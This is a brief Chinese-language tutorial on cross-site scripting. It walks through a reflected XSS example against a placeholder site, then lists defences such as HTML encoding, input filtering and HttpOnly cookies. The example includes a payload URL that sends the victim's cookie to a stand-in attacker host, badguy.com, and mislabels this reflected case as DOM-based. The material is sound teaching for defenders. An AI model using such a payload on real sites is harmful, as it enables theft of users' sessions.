#XSS 跨域脚本攻击(cross-site scripting)
注入攻击的一种，不会对服务器造成任何伤害，通过一些站内正常交互，例如发布评论等提交含有JavaScript内容的文本。
这时如果服务端没有过滤或转义这些脚本，含有JavaScript脚本的内容发布到了页面上，其它用户访问页面的时候就会运行这些脚本。
XSS攻击的主要用于获取用户信息(例如Cookie)、在页面插入内容(例如广告)或流量劫持等。

##攻击场景 Dom-Based XSS
```
    // http://victim.com网站 后台代码
    <html>
    　　<title></title>
    　　<body>
    　　　　Results  for  <%Reequest.QueryString("term")%>
    　　　　...
    　　</body>
    </html>
    // 攻击
    // step1 建立后台用来偷取用户信息
    http://badguy.com
    // step2 发送恶意链接，可以通过邮件 qq等
    http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
    // 这时只要用户点击这个连接，那么生成的页面中就包含可以指向的代码片段
    <script>window.open("http://badguy.com?cookie="+document.cookie)</script>
    // 这个代码自动运行把用户的cookie发送到了攻击者的网站
```

##应对策略
一些高级浏览器会自动拦截XSS攻击但是不能完全拦截。
防治的根本之道是过滤用户的输入，做`encode`处理，将其中的`<`、`>`、`'`、`"`、`;`之类的特殊字符进行编码。
在这方面前端无法测地解决，更多的需要后端进行处理。

1. 将重要的cookie标记为http only,   这样的话Javascript 中的document.cookie语句就不能获取到cookie了.
2. 只允许用户输入我们期望的数据。 例如：　年龄的textbox中，只允许用户输入数字。 而数字之外的字符都过滤掉。
3. 对数据进行Html Encode 处理
4. 过滤或移除特殊的Html标签， 例如: <script>, <iframe> ,  &lt; for <, &gt; for >, &quot for
5. 过滤JavaScript 事件的标签。例如 "onclick=", "onfocus" 等等。